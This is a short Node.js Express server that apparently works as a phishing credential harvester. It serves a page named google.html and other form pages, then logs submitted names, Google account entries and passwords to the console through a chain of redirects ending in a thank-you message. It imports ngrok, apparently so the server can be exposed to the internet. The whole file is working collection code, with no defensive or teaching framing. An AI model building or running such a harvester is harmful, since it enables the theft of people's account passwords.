const http = require('http');
const ngrok = require('ngrok');

const express = require('express');
const { copyFileSync } = require('fs');
const app = express();

app.use(express.urlencoded())

app.get('/',(req,res)=>{
    console.log('he come');
    res.sendFile(`${__dirname}/index.html`);
})

app.get('/number',(req,res)=>{
    console.log('he come');
    res.sendFile(`${__dirname}/index2.html`);
})

app.post('/',(req,res)=>{
    console.log(req.body.name);
    res.redirect('/number')
})

app.get('/google',(req,res)=>{
    console.log('gogle');
    res.sendFile(`${__dirname}/google.html`);

})

app.post('/google',(req,res)=>{
    console.log(req.body.google);
    res.redirect('/number')
    
})

app.post('/number',(req,res)=>{
    console.log(req.body.pass)
    res.redirect('/text')
})

app.get('/text',(req,res)=>{
    res.send("<h1> thanks you so much </h1>")
})
const port = 4000;


app.listen(port, (err)=>{
    if (err) return console.log(`Something bad happened: ${err}`);
    // console.log(`Node.js server listening on ${port}`);

});
